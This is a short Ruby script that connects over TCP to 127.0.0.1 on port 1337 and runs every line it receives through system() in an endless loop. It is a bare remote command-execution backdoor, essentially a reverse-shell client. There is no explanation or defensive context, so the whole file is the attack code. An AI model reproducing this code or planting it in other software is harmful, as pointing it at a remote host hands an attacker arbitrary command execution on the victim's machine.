require "socket"
sock = TCPSocket.new("127.0.0.1" , 1337)

while (1)
  system(sock.gets)

end
